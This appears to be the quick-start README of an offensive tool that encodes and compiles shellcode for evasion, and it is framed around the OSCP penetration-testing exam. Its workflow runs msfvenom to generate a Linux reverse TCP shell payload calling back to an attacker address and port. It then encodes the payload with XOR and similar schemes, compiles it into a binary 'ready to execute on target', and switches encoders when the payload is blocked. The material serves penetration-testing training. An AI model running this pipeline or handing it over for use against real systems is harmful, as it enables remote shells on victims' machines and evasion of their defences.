# Quick Start Guide

## 5-Minute Setup

### 1. Build Docker Image
```bash
cd ShellcodingDream-Complete
docker-compose build
```

### 2. Test It Works
```bash
docker-compose run --rm shellcoding list
```

### 3. Done! 

You're ready to use the tool.

---

## Basic Commands

### Show Help
```bash
docker-compose run --rm shellcoding --help
```

### List Encoders
```bash
docker-compose run --rm shellcoding list
```

### Show OSCP Quick Reference
```bash
docker-compose run --rm shellcoding oscp
```

### Encode Shellcode
```bash
# First create or provide shellcode file (hex format)
docker-compose run --rm shellcoding encode \
  --technique xor \
  --input shellcode.hex \
  --output encoded.c
```

### Compile
```bash
docker-compose run --rm shellcoding compile \
  --technique xor \
  --input encoded.c \
  --platform linux \
  --arch x64 \
  --output my_payload
```

### Full Pipeline (Recommended)
```bash
# One command: encode + compile + test
docker-compose run --rm shellcoding pipeline \
  --technique xor \
  --input shellcode.hex \
  --platform linux
```

---

## Example Workflow

### Step 1: Generate Shellcode with MSFvenom

```bash
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f c \
  -o payload.hex
```

### Step 2: Run Pipeline

```bash
docker-compose run --rm shellcoding pipeline \
  --technique xor \
  --input payload.hex \
  --platform linux
```

### Step 3: Use the Output

The compiled binary is ready to execute on target.

---

## All Available Encoders

- **xor** - XOR cipher (fastest)
- **rot13** - Caesar cipher
- **base64** - Base64 encoding
- **rc4** - RC4 stream cipher
- **uuid** - UUID format
- **ip** - IP address format
- **mac** - MAC address format

---

## Troubleshooting

### "docker-compose: command not found"
```bash
# Install Docker Compose
sudo curl -L "https://github.com/docker/compose/releases/download/v2.20.0/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
sudo chmod +x /usr/local/bin/docker-compose
```

### "Cannot connect to Docker daemon"
```bash
# Start Docker
sudo systemctl start docker

# Or on Mac/Windows, start Docker Desktop
```

### Compilation fails with "gcc: not found"
```bash
# Rebuild without cache
docker-compose build --no-cache
```

### "No such file or directory: shellcode.hex"
```bash
# Make sure shellcode file exists
ls -la shellcode.hex

# Or create one with MSFvenom first
msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c > test.hex
```

---

## For OSCP Exam

Before the exam:
1. Build the image: `docker-compose build`
2. Test it works: `docker-compose run --rm shellcoding list`
3. Practice: `docker-compose run --rm shellcoding oscp`

During exam:
1. Generate payload with msfvenom
2. Run: `docker-compose run --rm shellcoding pipeline --technique xor --input payload.hex --platform linux`
3. If blocked, try another encoder

See `docs/OSCP_GUIDE.md` for detailed exam instructions.

---

## Getting Help

```bash
# Show general help
docker-compose run --rm shellcoding --help

# Show specific command help
docker-compose run --rm shellcoding encode --help
docker-compose run --rm shellcoding compile --help
docker-compose run --rm shellcoding pipeline --help

# Show OSCP guide
docker-compose run --rm shellcoding oscp

# Check documentation
cat docs/OSCP_GUIDE.md
cat README.md
```

---

That's it! You're ready to go. 🚀
